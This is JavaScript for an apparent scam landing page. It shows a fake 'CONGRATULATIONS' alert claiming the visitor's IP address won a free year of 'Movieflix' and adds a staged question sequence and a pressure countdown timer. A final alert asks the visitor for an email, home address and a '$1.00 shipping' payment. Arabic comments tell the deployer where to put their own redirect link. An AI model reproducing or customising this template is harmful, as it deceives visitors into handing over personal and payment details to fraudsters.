var date = new Date();
        var days = ["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"];
        var months = ['January','February','March','April','May','June','July','August','September','October','November','December'];
        document.getElementById('date').innerHTML = `${days[date.getDay()]} ${date.getDate()} , ${months[date.getMonth()]} ${date.getFullYear()}`;
        $(window).on('load', function() {
            alert(`CONGRATULATIONS! nn We want to thank you for your loyalty to ! nn Your IP address has been selected to receive a Year of FREE Movieflix! nn Date: ${days[date.getDay()]} ${date.getDate()} , ${months[date.getMonth()]} ${date.getFullYear()} n Reference of user : GIFT-96951-97 `);
        });
        new WOW().init();
        $('.active').click(function(){
            $('.ask_1').fadeOut(500, function(){
                $('.ask_2').fadeIn(500)
            });
        });
        $('.active_2').click(function(){
            $('.ask_2').fadeOut(500, function(){
                $('.ask_3').fadeIn(500)
            });
        });
        $('.active_3').click(function(){
            $('.ask_3').fadeOut(500, function(){
                $('.animate_data .first_h3').fadeIn(700, function(){
                    $(this).fadeOut(500 , function(){
                        $('.animate_data .second_h3').fadeIn(500, function(){
                            $(this).delay(3000).fadeOut(500, function(){
                                $('.animate_data .third_h3').fadeIn(500, function(){
                                    $(this).fadeOut(500 , function(){
                                        $('.last_data').fadeIn(500);
                                    });
                                });
                            });
                        });
                    });
                });
            });
        });
        function startTimer(duration, display) {
            var timer = duration, minutes, seconds;
            setInterval(function () {
                minutes = parseInt(timer / 60, 10)
                seconds = parseInt(timer % 60, 10);

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                display.text(minutes + ":" + seconds);

                if (--timer < 0) {
                    timer = duration;
                    function pageRedirect() {
                        alert(`********** nn Your 1 Year of FREE Movieflix has been reserved! nn Please follow these instructions: nn 1. Click OK to reserve your 1 Year of FREE Movieflix. nn 2. Enter your email address and address to receive your 1 Year of FREE Movieflix. nn 3. Pay only $1.00 for shipping costs to receive your 1 Year of FREE Movieflix. nn ****`);
                        /* هنا تقدر تحط اللينك الانت عايزة بعد ما يدوس ok*/
                        // هتشيل الشباك وتحط اللينك بتاعك
                        window.location.replace("#1");
                        /* هنا تقدر تحط اللينك الانت عايزة بعد ما يدوس ok*/     
                    }      
                    setTimeout(pageRedirect(), 10000);
                }
            }, 1000);
        }
        var TwoMinutes = 60 * 2,
            display = $('#time');
        startTimer(TwoMinutes, display);